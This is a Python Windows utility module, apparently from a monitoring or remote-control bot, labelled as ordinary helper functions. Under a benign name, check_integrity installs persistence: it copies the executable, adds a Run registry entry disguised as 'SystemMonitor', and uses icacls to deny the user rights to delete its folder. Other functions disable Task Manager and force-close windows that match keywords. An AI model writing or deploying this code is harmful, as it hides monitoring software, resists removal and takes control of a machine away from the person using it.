"""
Utility Functions Module
Common helper functions

Developer: TsByin
"""

import os
import json
import ctypes
import subprocess
import time
import logging
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)

# ==============================================================================
# WINDOW & SYSTEM UTILITIES
# ==============================================================================

def get_active_window_title():
    """Get current active window title"""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except Exception as e:
        logger.debug(f"get_active_window_title failed: {e}")
        return ""

def close_window_by_handle(hwnd):
    """Close window by handle"""
    try:
        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
        return True
    except Exception as e:
        logger.debug(f"close_window_by_handle failed: {e}")
        return False

def find_and_close_window(keywords):
    """Find and close windows by keywords"""
    try:
        def callback(hwnd, extra):
            try:
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                title = buff.value.lower()
                
                for k in keywords:
                    if k.lower() in title:
                        close_window_by_handle(hwnd)
                        logger.info(f"Closed window: {title}")
                        return True
            except:
                pass
            return True
        
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        ctypes.windll.user32.EnumWindows(CMPFUNC(callback), 0)
    except Exception as e:
        logger.error(f"find_and_close_window failed: {e}")

def show_message_box(text):
    """Display system message box"""
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "⚠️ THÔNG BÁO TỪ QUẢN TRỊ", 
                                         0x40 | 0x1 | 0x40000)
        return True
    except Exception as e:
        logger.error(f"show_message_box failed: {e}")
        return False

def protect_folder(path):
    """Protect folder using NTFS permissions"""
    try:
        user = os.getlogin()
        cmd = f'icacls "{path}" /deny {user}:(D,WDAC,WO) /t /c /q'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
        logger.info(f"Protected folder: {path}")
        return True
    except Exception as e:
        logger.error(f"protect_folder failed: {e}")
        return False

# ==============================================================================
# SETTINGS & JSON MANAGEMENT
# ==============================================================================

def load_json_safe(filepath, default=None):
    """Safely load JSON file"""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Load JSON {filepath} failed: {e}")
    
    return default if default is not None else {}

def save_json_safe(filepath, data):
    """Safely save JSON file"""
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        logger.info(f"Saved JSON: {filepath}")
        return True
    except Exception as e:
        logger.error(f"Save JSON {filepath} failed: {e}")
        return False

def load_settings(settings_file):
    """Load bot settings"""
    return load_json_safe(settings_file, {"menu_mode": 1})

def save_settings(settings_file, mode):
    """Save bot settings"""
    return save_json_safe(settings_file, {"menu_mode": mode})

def load_blocked_list(blocked_file):
    """Load blocked apps/sites list"""
    data = load_json_safe(blocked_file, {"apps": [], "sites": []})
    if "apps" not in data:
        data["apps"] = []
    if "sites" not in data:
        data["sites"] = []
    return data

def save_blocked_list(blocked_file, blocked_data):
    """Save blocked apps/sites list"""
    return save_json_safe(blocked_file, blocked_data)

# ==============================================================================
# TEXT & SPEECH
# ==============================================================================

def speak_text(text):
    """Text-to-speech output"""
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        logger.info(f"Spoke: {text[:50]}")
        return True
    except Exception as e:
        logger.error(f"speak_text failed: {e}")
        return False

# ==============================================================================
# TASK MANAGEMENT
# ==============================================================================

def get_installed_browsers(browser_paths):
    """Get list of installed browsers"""
    return [name for name, path in browser_paths.items() if os.path.exists(path)]

def set_taskmgr_state(enable=True):
    """Enable/Disable Task Manager"""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        if enable:
            try:
                winreg.DeleteValue(key, "DisableTaskMgr")
            except:
                pass
        else:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        
        winreg.CloseKey(key)
        logger.info(f"TaskMgr state set to: {'ENABLED' if enable else 'DISABLED'}")
        return True
    except Exception as e:
        logger.error(f"set_taskmgr_state failed: {e}")
        return False

def check_integrity(target_dir, target_exe, current_exe):
    """Check and maintain persistence"""
    try:
        os.makedirs(target_dir, exist_ok=True)
        
        # Copy executable if needed
        if os.path.abspath(current_exe).lower() != os.path.abspath(target_exe).lower():
            import shutil
            shutil.copy2(current_exe, target_exe)
            logger.info(f"Copied executable to {target_exe}")
        
        # Add to Registry
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, target_exe)
            winreg.CloseKey(key)
            logger.info("Registry persistence added")
        except Exception as e:
            logger.warning(f"Registry update failed: {e}")
        
        # Protect folder
        protect_folder(target_dir)
        return True
    except Exception as e:
        logger.error(f"check_integrity failed: {e}")
        return False

# ==============================================================================
# FILE OPERATIONS
# ==============================================================================

def compress_file(input_file):
    """Compress file using gzip"""
    try:
        import gzip
        output_file = f"{input_file}.gz"
        
        with open(input_file, 'rb') as f_in:
            with gzip.open(output_file, 'wb') as f_out:
                f_out.writelines(f_in)
        
        os.remove(input_file)
        logger.info(f"Compressed: {input_file} -> {output_file}")
        return output_file
    except Exception as e:
        logger.error(f"compress_file failed: {e}")
        return input_file

def safe_remove_file(filepath):
    """Safely remove file"""
    try:
        if os.path.exists(filepath):
            os.remove(filepath)
            logger.debug(f"Removed: {filepath}")
            return True
    except Exception as e:
        logger.error(f"safe_remove_file failed: {e}")
    return False

def get_file_size_mb(filepath):
    """Get file size in MB"""
    try:
        return os.path.getsize(filepath) / (1024 * 1024)
    except:
        return 0

# ════════════════════════════════════════════════
# Developer: TsByin
# Module: Utility Helpers & System Functions
# ════════════════════════════════════════════════
